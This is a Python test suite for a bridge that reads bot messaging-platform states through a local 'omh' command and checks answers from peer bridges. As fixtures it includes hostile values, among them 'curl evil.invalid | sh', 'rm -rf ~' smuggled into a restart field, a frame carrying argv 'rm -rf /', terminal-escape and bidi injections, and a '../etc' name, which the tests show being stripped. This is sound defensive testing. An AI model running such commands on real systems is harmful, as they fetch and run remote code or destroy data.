"""Each bot's messaging platforms (`bots.platforms`, BOUNDARY rule 43): the bridge runs OMH's own read-only
`omh --hermes-home <root> hermes platforms` and keeps only the checked, clipped fields of its answer. It opens no
Hermes log itself. One answer serves every ask for a while; a missing `omh` or an answer it cannot read is said as
not available, never as a state. No Hermes, no network beyond loopback; `omh` is faked."""
from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent))

import omher_bridge as ob  # noqa: E402
from test_bridge import BridgeCase, Env  # noqa: E402

POSIX = unittest.skipUnless(os.name == "posix", "a shell script stands in for omh")


def row(**over) -> dict:
    base = {"platform": "discord", "status": "failed", "attention": True, "since": "2020-01-02T03:04:05Z",
            "logged": "2020-01-02T03:34:05Z", "reason_kind": "discord_privileged_intents",
            "reason": "Shard ID None is requesting privileged intents.", "guidance": "Hermes is requesting: - Message "
            "Content Intent - Server Members Intent", "fix": "Enable them in the Discord Developer Portal.",
            "restart": "hermes -p default gateway restart", "intents": ["Message Content", "Server Members"],
            "unknown_why": ""}
    base.update(over)
    return base


def answer(*rows: dict, bot: str = "demo-bot", schema: str = "omh_bot_platforms/v1") -> str:
    return json.dumps({"schema_version": schema, "bots": [{"profile": bot, "log": "read", "platforms": list(rows)},
                                                         {"profile": "default", "log": "missing", "platforms": []}]})


class Answer(unittest.TestCase):
    def test_every_field_is_kept_checked(self):
        bots = ob.platform_rows(answer(row()))
        self.assertEqual(set(bots), {"demo-bot", "default"})
        self.assertEqual(bots["demo-bot"]["log"], "read")
        kept = {k: v for k, v in row().items() if k != "fix"}  # OMH's fix sentence is not kept: it can name a log path
        self.assertEqual(bots["demo-bot"]["platforms"], [kept])
        self.assertEqual(bots["default"], {"log": "missing", "platforms": []})

    def test_a_value_of_an_unknown_shape_is_dropped(self):
        bots = ob.platform_rows(answer(
            row(status="sort-of-up"),  # a status the page does not know: no row at all
            row(platform="Discord Bot"),  # not a platform name
            row(platform="slack", restart="rm -rf ~; hermes -p default gateway restart", since="yesterday",
                reason_kind="Bad Kind", intents=["Message Content", "Everything"], reason="x" * 5000,
                attention="yes"),
        ))
        kept = bots["demo-bot"]["platforms"]
        self.assertEqual([r["platform"] for r in kept], ["slack"])
        slack = kept[0]
        self.assertEqual((slack["restart"], slack["since"], slack["reason_kind"], slack["attention"]), ("", "", "", False))
        self.assertEqual(slack["intents"], ["Message Content"])
        self.assertEqual(len(slack["reason"]), ob.PLATFORM_TEXT_MAX["reason"])
        self.assertTrue(slack["reason"].endswith("…"))
        self.assertEqual(ob.platform_rows(answer(row(reason="two\nlines\r\nhere")))["demo-bot"]["platforms"][0]["reason"],
                         "two lines here")

    def test_escapes_control_and_bidi_characters_are_dropped(self):
        raw = "\x1b[31mred\x1b[0m \x1b]8;;http://evil.invalid\x07click\x1b]8;;\x07 \u202eevil\u202c \x9b2J nul\x00 end"
        got = ob.platform_rows(answer(row(reason=raw, guidance=raw)))["demo-bot"]["platforms"][0]
        self.assertEqual((got["reason"], got["guidance"]), ("red click evil nul end",) * 2)

    def test_anything_that_is_not_the_answer_is_none(self):
        for out in (None, "", "not json", "[]", json.dumps({"bots": []}), answer(row(), schema="omh_bot_platforms/v2"),
                    " " * (ob.OMH_READ_OUTPUT_MAX + 1)):
            with self.subTest(out=(out or "")[:20]):
                self.assertIsNone(ob.platform_rows(out))
        self.assertEqual(ob.platform_rows(answer(row(), bot="../etc")), {"default": {"log": "missing", "platforms": []}})


class FindAndRun(unittest.TestCase):
    def test_the_one_argv(self):
        home = Path("/h") / ".hermes"
        # rule 43's entry and rule 44's (the Add bot gallery's templates, test_bot_create)
        self.assertEqual(ob.OMH_READS, {"platforms": ("hermes", "platforms"),
                                        "bot_templates": ("profile", "bot-templates", "--json")})
        self.assertEqual(ob.omh_read_argv("/x/omh", home, "platforms"),
                         ["/x/omh", "--hermes-home", str(home), "hermes", "platforms"])
        with self.assertRaises(KeyError):
            ob.omh_read_argv("/x/omh", home, "doctor")  # only a read the table lists

    @POSIX
    def test_omh_is_found_on_path_else_where_its_installer_puts_it(self):
        self.assertEqual(ob.omh_path(which=lambda name: "/usr/local/bin/omh"), "/usr/local/bin/omh")
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            with mock.patch.object(Path, "home", return_value=home):
                self.assertIsNone(ob.omh_path(which=lambda name: None, environ={}))
                venv = home / ".local" / "share" / "omh" / "venv" / "bin" / "omh"
                venv.parent.mkdir(parents=True)
                venv.write_text("#!/bin/sh\n")
                venv.chmod(0o755)
                self.assertEqual(ob.omh_path(which=lambda name: None, environ={}), str(venv))
                data = home / "data"
                other = data / "omh" / "venv" / "bin" / "omh"
                other.parent.mkdir(parents=True)
                other.write_text("#!/bin/sh\n")
                other.chmod(0o755)
                self.assertEqual(ob.omh_path(which=lambda name: None, environ={"XDG_DATA_HOME": str(data)}), str(other))

    @POSIX
    def test_a_relative_or_current_folder_omh_from_path_is_passed_over(self):
        with tempfile.TemporaryDirectory() as tmp:
            with mock.patch.object(Path, "home", return_value=Path(tmp)):
                # `PATH=.:…` or `bin`: which() answers relative to the bridge's folder, and Popen would resolve it
                # against the home folder it starts in, so a different `omh` would run
                for relative in ("bin/omh", "./omh", "omh"):
                    self.assertIsNone(ob.omh_path(which=lambda name, r=relative: r, environ={}), relative)
                self.assertIsNone(ob.omh_path(which=lambda name: os.path.join(os.getcwd(), "omh"), environ={}))

    @POSIX
    def test_on_windows_a_cmd_shim_is_passed_over_for_the_venvs_exe(self):
        with tempfile.TemporaryDirectory() as tmp:
            exe = Path(tmp) / "omh" / "venv" / "Scripts" / "omh.exe"
            find = lambda found: ob.omh_path(which=lambda name: found, environ={"LOCALAPPDATA": tmp}, windows=True)
            with mock.patch.object(Path, "home", return_value=Path(tmp)):
                self.assertEqual(find("/opt/omh/omh.EXE"), "/opt/omh/omh.EXE")
                self.assertIsNone(find(r"C:\bin\omh.cmd"))
                exe.parent.mkdir(parents=True)
                exe.write_text("")
                exe.chmod(0o755)
                self.assertEqual(find(r"C:\bin\omh.cmd"), str(exe))

    @POSIX
    def test_the_run_takes_no_stdin_no_hermes_python_variables_and_fails_closed(self):
        with tempfile.TemporaryDirectory() as tmp:
            script = Path(tmp) / "omh"
            script.write_text('#!/bin/sh\nread line && printf "stdin:%s|" "$line"\n'
                              'printf "%s|%s|%s|%s" "${PYTHONPATH-unset}${PYTHONWARNINGS-}" "$NO_COLOR" "$PWD" "$*"\n')
            script.chmod(0o755)
            with mock.patch.dict(os.environ, {"PYTHONPATH": "/hermes/checkout", "PYTHONWARNINGS": "error",
                                              "HERMES_GATEWAY": "1"}):
                out = ob.run_omh_read(str(script), Path(tmp) / ".hermes", "platforms")
            self.assertEqual(out, f"unset|1|{Path.home()}|--hermes-home {Path(tmp) / '.hermes'} hermes platforms")
            script.write_text("#!/bin/sh\necho partial; exit 3\n")
            self.assertIsNone(ob.run_omh_read(str(script), Path(tmp), "platforms"))
            script.write_text("#!/bin/sh\necho oops >&2; printf '{}'\n")
            self.assertEqual(ob.run_omh_read(str(script), Path(tmp), "platforms"), "{}", "stderr is not the answer")
            self.assertIsNone(ob.run_omh_read(str(Path(tmp) / "absent"), Path(tmp), "platforms"))
            with mock.patch.object(ob, "OMH_READ_OUTPUT_MAX", 8):
                script.write_text("#!/bin/sh\nprintf '0123456789'\n")
                self.assertIsNone(ob.run_omh_read(str(script), Path(tmp), "platforms"), "too long: refused, not cut")

    @POSIX
    def test_a_read_past_its_time_is_stopped_with_what_it_started(self):
        with tempfile.TemporaryDirectory() as tmp:
            script, pid_file = Path(tmp) / "omh", Path(tmp) / "child.pid"
            script.write_text(f'#!/bin/sh\nsleep 30 &\necho $! > "{pid_file}"\nwait\n')
            script.chmod(0o755)
            # 3 s: room for the shell to write the child's pid before the stop, even on a loaded runner
            self.assertIsNone(ob.run_omh_read(str(script), Path(tmp), "platforms", timeout=3.0))
            self.assertTrue(pid_file.exists(), "the script never wrote its child's pid before the stop")
            child = int(pid_file.read_text())
            for _ in range(50):
                try:
                    os.kill(child, 0)
                except ProcessLookupError:
                    break
                import time
                time.sleep(0.05)
            else:
                self.fail("the read's own child outlived the stop")


class Cache(unittest.TestCase):
    def states(self, out: str | None, omh: str | None = "/x/omh"):
        self.now, self.runs = 0.0, []

        def run(path, home, read):
            self.runs.append((path, home))
            self.assertEqual(read, "platforms")
            return out

        return ob.PlatformStates(Path("/h"), find=lambda: omh, run=run, clock=lambda: self.now)

    def test_one_run_serves_every_ask_for_a_while(self):
        states = self.states(answer(row()))
        first = states.read()
        self.assertTrue(first["available"])
        self.assertEqual(first["bots"]["demo-bot"]["platforms"][0]["status"], "failed")
        self.now = ob.PLATFORMS_TTL - 1
        self.assertIs(states.read(), first)
        self.now = ob.PLATFORMS_TTL
        states.read()
        self.assertEqual(self.runs, [("/x/omh", Path("/h"))] * 2)

    def test_read_again_asks_again_once_the_answer_is_two_seconds_old(self):
        states = self.states(answer(row()))
        states.read()
        self.now = 1.0
        states.read(fresh=True)
        self.assertEqual(len(self.runs), 1)
        self.now = 2.0
        states.read(fresh=True)
        self.assertEqual(len(self.runs), 2)

    def test_no_omh_or_an_unreadable_answer_is_not_available_and_asked_again_later(self):
        missing = self.states(answer(row()), omh=None)
        self.assertEqual(missing.read(), {"available": False, "bots": {}})
        self.assertEqual(self.runs, [])
        broken = self.states("Traceback (most recent call last):")
        self.assertEqual(broken.read(), {"available": False, "bots": {}})
        self.now = ob.PLATFORMS_TTL
        broken.read()
        self.assertEqual(len(self.runs), 1, "a failed answer waits PLATFORMS_TTL_MISS")
        self.now = ob.PLATFORMS_TTL_MISS
        broken.read()
        self.assertEqual(len(self.runs), 2)


class PlatformsOp(BridgeCase):
    async def test_the_op_answers_from_omh_without_a_gateway(self):
        async with Env(("demo-bot",)) as env:
            calls = []

            def run(path, home, read):
                calls.append((path, home, read))
                return answer(row(), bot="demo-bot")

            env.bridge.platforms = ob.PlatformStates(env.home, find=lambda: "/x/omh", run=run)
            s = await self.open(env)
            r = await s.req("bots.platforms")
            self.assertTrue(r["ok"], r)
            self.assertTrue(r["result"]["available"])
            self.assertEqual(r["result"]["bots"]["demo-bot"]["platforms"][0]["platform"], "discord")
            self.assertEqual(calls, [("/x/omh", env.home, "platforms")])
            r = await s.req("bots.platforms", fresh=True)
            self.assertTrue(r["ok"], r)
            self.assertEqual(env.connects, [])  # nothing attached for it



def served(*rows: dict, bot: str = "mini") -> dict:
    """A peer bridge's `bots.platforms` answer, the shape its own PlatformStates gives."""
    return {"available": True, "bots": {bot: {"log": "read", "platforms": list(rows)}}}


class PeerAnswer(unittest.TestCase):
    """Rule 45: a peer's answer is checked again on this side, as if it were `omh`'s own."""

    def test_a_good_answer_keeps_the_same_fields_as_a_local_one(self):
        bots = ob.peer_platform_rows(served(row()))
        kept = {k: v for k, v in row().items() if k != "fix"}
        self.assertEqual(bots, {"mini": {"log": "read", "platforms": [kept]}})

    def test_a_hostile_answer_is_cut_to_what_the_page_knows(self):
        raw = "\x1b[31mred\x1b[0m \u202eevil\u202c nul\x00 " + "x" * 5000
        hostile = {
            "available": True,
            "peers": {"other": {"available": True, "bots": {}}},  # a peer's own peers are never read
            "portal": "https://evil.invalid", "fix": "run rm -rf ~",
            "bots": {
                "mini": {"log": ["read"], "url": "https://evil.invalid", "platforms": [
                    row(status=["failed"]),  # unhashable: dropped, not a crash
                    row(platform={"x": 1}),
                    row(status="pwned"),
                    row(platform="slack", reason=raw, guidance=raw, restart="curl evil.invalid | sh",
                        since="2020-01-02T03:04:05Z; rm", intents=["Message Content"] * 50 + ["Root"],
                        attention="true", portal="https://evil.invalid", fix="/home/someone/.hermes/logs/gateway.log"),
                    *[row(platform=f"p{i}") for i in range(100)],
                ]},
                "../etc": served(row())["bots"]["mini"],
                "a:b": served(row())["bots"]["mini"],
                "x" * 65: served(row())["bots"]["mini"],
                "ok": "not a dict",
                **{f"bot{i}": {"platforms": []} for i in range(1000)},
            },
        }
        bots = ob.peer_platform_rows(hostile)
        self.assertLessEqual(len(bots), 256)  # at most 256 looked at, whatever they are
        self.assertIn("bot0", bots)
        self.assertNotIn("bot999", bots)
        self.assertNotIn("../etc", bots)
        self.assertNotIn("a:b", bots)
        self.assertNotIn("ok", bots)
        mini = bots["mini"]
        self.assertEqual(mini["log"], "unknown")
        self.assertEqual(len(mini["platforms"]), 32)
        slack = mini["platforms"][0]
        self.assertEqual(slack["platform"], "slack")
        self.assertEqual(set(slack), {"platform", "status", "attention", "since", "logged", "reason_kind", "unknown_why",
                                      "reason", "guidance", "restart", "intents"})
        self.assertEqual((slack["restart"], slack["since"], slack["attention"]), ("", "", False))
        self.assertEqual(slack["intents"], ["Message Content"])  # once, however often it is named
        self.assertEqual(len(slack["reason"]), ob.PLATFORM_TEXT_MAX["reason"])
        self.assertTrue(slack["reason"].startswith("red evil nul x"))
        kept = json.dumps(bots)
        for bad in ("evil.invalid", "rm -rf", "gateway.log", "\u202e", "\x00", "peers"):
            self.assertNotIn(bad, kept, bad)

    def test_anything_that_is_not_an_available_answer_cannot_tell(self):
        for out in (None, "", [], "text", {"available": False, "bots": {}}, {"available": False, "bots": served(row())["bots"]},
                    {"available": "yes", "bots": {}}, {"available": 1, "bots": {}}, {"available": True, "bots": []},
                    {"available": True}):
            with self.subTest(out=out):
                self.assertIsNone(ob.peer_platform_rows(out))


class PeerPlatforms(BridgeCase):
    """Rule 45: a second, real bridge on loopback stands in for the other computer's. The local bridge asks it once per
    poll interval with the bare op and nothing in it; that bridge runs its own (faked) rule 43 read; what comes back is
    checked again here."""

    TOKEN = "cd" * 16

    def counted(self, out, omh="/x/omh"):
        runs = []

        def run(path, home, read):
            runs.append((path, home, read))
            return out

        return runs, run, omh

    async def _two(self, stack, remote_out=None, *, remote_omh="/x/omh"):
        from contextlib import AsyncExitStack  # noqa: F401
        local = await stack.enter_async_context(Env(("kami",)))
        remote = Env(("mini",))
        remote.bridge = ob.Bridge(token=self.TOKEN, hermes_home=remote.home, gateway_factory=remote.factory, poll_s=3600,
                                  omher_home=remote.home / ".omher")
        self.local_runs, run, _ = self.counted(answer(row(), bot="kami"))
        local.bridge.platforms = ob.PlatformStates(local.home, find=lambda: "/x/omh", run=run)
        self.remote_runs, run, _ = self.counted(answer(row(), bot="mini") if remote_out is None else remote_out)
        remote.bridge.platforms = ob.PlatformStates(remote.home, find=lambda: remote_omh, run=run)
        # what the serving side was asked: every frame of the op, as it arrived
        self.asked = []
        serve = remote.bridge.ops["bots.platforms"]

        async def record(p):
            self.asked.append(dict(p))
            return await serve(p)
        remote.bridge.ops["bots.platforms"] = record
        await stack.enter_async_context(remote)
        s = await self.open(local)
        url = f"ws://127.0.0.1:{remote.port}/?token={self.TOKEN}"
        r = await s.req("peers.attach", peer="far", label="Other computer", host="user@host.example", url=url)
        self.assertTrue(r["ok"], r)
        return local, remote, s, url

    @staticmethod
    def _updates(s) -> int:
        return sum(1 for e in s.events if e["event"] == "platforms.update")

    async def _peer(self, s, **params) -> dict:
        """`bots.platforms` once the peer's ask landed: the first answer never waits for it (`unasked`), and
        `platforms.update` says when to read again."""
        n = self._updates(s)
        r = await s.req("bots.platforms", **params)
        self.assertTrue(r["ok"], r)
        if r["result"]["peers"]["far"]["why"] != "unasked":
            return r["result"]
        await s.until(lambda ev: self._updates(s) > n)
        return (await s.req("bots.platforms"))["result"]

    async def test_the_peers_bots_come_back_checked_from_its_own_read(self):
        from contextlib import AsyncExitStack
        async with AsyncExitStack() as stack:
            local, remote, s, _ = await self._two(stack)
            res = await self._peer(s)
            self.assertEqual(set(res["bots"]), {"kami", "default"})  # this computer's, as before
            far = res["peers"]["far"]
            self.assertEqual((far["available"], far["why"]), (True, ""))
            self.assertEqual(far["bots"]["mini"]["platforms"][0]["status"], "failed")
            self.assertNotIn("fix", far["bots"]["mini"]["platforms"][0])
            # that computer ran its own read of its own Hermes root; the ask carried nothing a caller chose
            self.assertEqual(self.remote_runs, [("/x/omh", remote.home, "platforms")])
            self.assertEqual([{k: v for k, v in a.items() if k != "id"} for a in self.asked], [{"op": "bots.platforms"}])
            self.assertEqual((local.connects, remote.connects), ([], []))  # no gateway for it, here or there

    async def test_one_ask_per_peer_per_interval_and_fresh_never_reaches_it(self):
        import asyncio
        from contextlib import AsyncExitStack
        async with AsyncExitStack() as stack:
            local, remote, s, _ = await self._two(stack)
            n = self._updates(s)
            got = await asyncio.gather(*(s.req("bots.platforms", fresh=True) for _ in range(20)))
            self.assertTrue(all(r["ok"] for r in got))
            await s.until(lambda ev: self._updates(s) > n)
            for _ in range(5):
                self.assertTrue((await s.req("bots.platforms", fresh=True))["ok"])
            self.assertEqual(len(self.asked), 1, "overlapping and repeated asks share one ask of the peer")
            self.assertNotIn("fresh", self.asked[0])
            self.assertEqual(len(self.remote_runs), 1)
            link = local.bridge.peers["far"]
            link.platforms_at -= ob.PLATFORMS_TTL  # the interval is over
            n = self._updates(s)
            self.assertTrue((await s.req("bots.platforms"))["result"]["peers"]["far"]["available"])  # last answer stands
            await s.until(lambda ev: self._updates(s) > n)
            self.assertEqual(len(self.asked), 2)

    async def test_a_peer_flooding_the_serving_side_runs_omh_no_more_than_its_cache_allows(self):
        import asyncio
        from contextlib import AsyncExitStack
        async with AsyncExitStack() as stack:
            local, remote, s, url = await self._two(stack)
            # a requester that does not follow the rules talks to the serving bridge directly, `fresh` and all
            from websockets.asyncio.client import connect
            ws = await stack.enter_async_context(connect(url, proxy=None))

            async def ask(i):
                await ws.send(json.dumps({"id": f"x{i}", "op": "bots.platforms", "fresh": True, "home": "/etc",
                                          "argv": ["rm", "-rf", "/"]}))
            await asyncio.gather(*(ask(i) for i in range(50)))
            seen = 0
            while seen < 50:
                f = json.loads(await asyncio.wait_for(ws.recv(), 10))
                if f.get("id", "").startswith("x"):
                    self.assertTrue(f["ok"], f)
                    seen += 1
            # one run of the one fixed argv (rule 43's 2-second floor for a Read again), its own root, no caller value
            self.assertEqual(self.remote_runs, [("/x/omh", remote.home, "platforms")])

    async def test_an_offline_an_older_or_an_omh_less_peer_cannot_tell(self):
        from contextlib import AsyncExitStack
        async with AsyncExitStack() as stack:  # no `omh` on that computer
            local, remote, s, _ = await self._two(stack, remote_omh=None)
            far = (await self._peer(s))["peers"]["far"]
            self.assertEqual((far["available"], far["why"], far["bots"]), (False, "unread", {}))
            self.assertEqual(self.remote_runs, [])
        async with AsyncExitStack() as stack:  # an answer that is not OMH's
            local, remote, s, _ = await self._two(stack, remote_out="Traceback (most recent call last):")
            far = (await self._peer(s))["peers"]["far"]
            self.assertEqual((far["available"], far["why"]), (False, "unread"))
            # a failed answer is asked again only after PLATFORMS_TTL_MISS
            local.bridge.peers["far"].platforms_at -= ob.PLATFORMS_TTL
            await s.req("bots.platforms")
            self.assertEqual(len(self.asked), 1)
        async with AsyncExitStack() as stack:  # a bridge from before rule 45's op
            local, remote, s, _ = await self._two(stack)
            del remote.bridge.ops["bots.platforms"]
            far = (await self._peer(s))["peers"]["far"]
            self.assertEqual((far["available"], far["why"]), (False, "unread"))
        async with AsyncExitStack() as stack:  # the link is down
            local, remote, s, _ = await self._two(stack)
            self.assertTrue((await self._peer(s))["peers"]["far"]["available"])
            n = self._updates(s)
            await local.bridge.peers["far"].ws.close()
            await s.until(lambda ev: self._updates(s) > n)  # the app is told at once, not at the next poll
            far = (await s.req("bots.platforms"))["result"]["peers"]["far"]
            self.assertEqual((far["available"], far["why"], far["bots"]), (False, "offline", {}))

    async def test_a_hostile_peer_answer_is_checked_on_this_side(self):
        from contextlib import AsyncExitStack
        async with AsyncExitStack() as stack:
            local, remote, s, _ = await self._two(stack)

            async def hostile(p):
                return {"available": True, "peers": {"x": {}}, "bots": {
                    "mini": {"log": "read", "platforms": [row(reason="\u202eok\x1b[2J" + "y" * 9000, fix="/root/.hermes/logs/gateway.log",
                                                             restart="hermes -p mini gateway restart; curl evil.invalid")]
                             + [row(platform=f"p{i}") for i in range(60)]},
                    **{f"b{i}": {"platforms": [row(reason="", guidance="")]} for i in range(400)}}}
            remote.bridge.ops["bots.platforms"] = hostile
            far = (await self._peer(s))["peers"]["far"]
            self.assertTrue(far["available"])
            self.assertEqual(len(far["bots"]), 256)
            self.assertEqual(len(far["bots"]["mini"]["platforms"]), 32)
            got = far["bots"]["mini"]["platforms"][0]
            self.assertEqual(got["restart"], "")
            self.assertTrue(got["reason"].startswith("ok") and len(got["reason"]) == ob.PLATFORM_TEXT_MAX["reason"])
            self.assertNotIn("fix", got)
            self.assertNotIn("peers", far)
            self.assertEqual(len(self.local_runs), 1, "a peer's answer never makes this computer run omh")

    async def test_a_slow_or_hung_peer_never_holds_back_this_computers_rows(self):
        import asyncio
        import time
        from contextlib import AsyncExitStack
        async with AsyncExitStack() as stack:
            local, remote, s, _ = await self._two(stack)
            serve = remote.bridge.ops["bots.platforms"]
            gate = asyncio.Event()

            async def hung(p):  # answers only when the test says so: a 3 s peer, or one that never answers
                await gate.wait()
                return await serve(p)
            remote.bridge.ops["bots.platforms"] = hung
            n = self._updates(s)
            for fresh in (False, True, True):  # the minute's poll and the local Read again
                t0 = time.monotonic()
                r = await s.req("bots.platforms", fresh=fresh)
                self.assertLess(time.monotonic() - t0, 1.0)  # a generous bound: the local read is faked
                self.assertEqual(set(r["result"]["bots"]), {"kami", "default"})
                far = r["result"]["peers"]["far"]
                self.assertEqual((far["available"], far["why"]), (False, "unasked"))
            gate.set()  # it lands: the app is told, and the next read has the peer's rows
            await s.until(lambda ev: self._updates(s) > n)
            self.assertEqual(len(self.asked), 1)  # the three reads shared one ask
            far = (await s.req("bots.platforms"))["result"]["peers"]["far"]
            self.assertTrue(far["available"])
            self.assertEqual(far["bots"]["mini"]["platforms"][0]["status"], "failed")
            # stale and hung again: the last checked answer stands at once, never "cannot tell" for it
            gate.clear()
            local.bridge.peers["far"].platforms_at -= ob.PLATFORMS_TTL
            t0 = time.monotonic()
            far = (await s.req("bots.platforms", fresh=True))["result"]["peers"]["far"]
            self.assertLess(time.monotonic() - t0, 1.0)
            self.assertTrue(far["available"])
            gate.set()

    async def test_a_peer_cannot_raise_this_computers_platforms_update(self):
        import asyncio
        from contextlib import AsyncExitStack
        async with AsyncExitStack() as stack:
            local, remote, s, _ = await self._two(stack)
            await self._peer(s)
            n, asked = self._updates(s), len(self.asked)
            for bot in ("mini", "x"):
                await remote.bridge.emit("platforms.update", bot)
            await remote.bridge.emit("bot.status", "mini", status="online", running=False)  # a later event still comes
            await s.until(lambda ev: any(e["event"] == "bot.status" and e["bot"] == "far:mini" for e in ev))
            await asyncio.sleep(0.05)
            self.assertEqual(self._updates(s), n)
            self.assertEqual(len(self.asked), asked)

    async def test_a_reconnect_keeps_the_interval(self):
        from contextlib import AsyncExitStack
        async with AsyncExitStack() as stack:
            local, remote, s, url = await self._two(stack)
            await self._peer(s)
            r = await s.req("peers.attach", peer="far", label="Other computer", host="user@host.example", url=url)
            self.assertTrue(r["ok"], r)
            self.assertTrue((await s.req("bots.platforms"))["result"]["peers"]["far"]["available"])
            self.assertEqual(len(self.asked), 1, "the same computer again is not asked again inside the interval")

    def test_a_platform_named_twice_keeps_its_first_row_and_intents_once(self):
        bots = ob.peer_platform_rows(served(row(intents=["Presence"] * 3), row(status="connected"), row(platform="slack")))
        rows = bots["mini"]["platforms"]
        self.assertEqual([(r["platform"], r["status"]) for r in rows], [("discord", "failed"), ("slack", "failed")])
        self.assertEqual(rows[0]["intents"], ["Presence"])

    async def test_a_peer_bot_never_forwards_the_op_itself(self):
        from contextlib import AsyncExitStack
        async with AsyncExitStack() as stack:
            local, remote, s, _ = await self._two(stack)
            r = await s.req("bots.platforms", bot="far:mini", fresh=True)
            self.assertEqual(r["error"]["code"], "remote_bot")
            self.assertEqual(self.asked, [])
            self.assertNotIn("bots.platforms", ob.PEER_FORWARD)


if __name__ == "__main__":
    unittest.main()
